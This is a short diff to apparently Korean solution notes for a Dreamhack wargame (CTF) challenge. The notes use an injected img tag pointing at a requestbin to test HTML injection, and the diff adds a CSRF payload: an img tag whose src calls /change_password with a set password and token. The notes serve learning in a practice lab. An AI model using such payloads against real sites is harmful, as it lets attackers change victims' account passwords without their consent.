@@ -6,7 +6,8 @@ solution..!
 - dreamhack tools로 임의 url 만들고 테스트
     - https://tools.dreamhack.games/requestbin/rjjkrhz
     - http://host3.dreamhack.games:9840/vuln?param=%3Cimg%20src=https://rjjkrhz.request.dreamhack.games%3E
-
+- img 태그 src에 붙여서 공격 (/flag)
+    - <img src="/change_password?pw=dreamhack&csrftoken=7505b9c72ab4aa94b1a4ed7b207b67fb">
 '''
 
 import hashlib
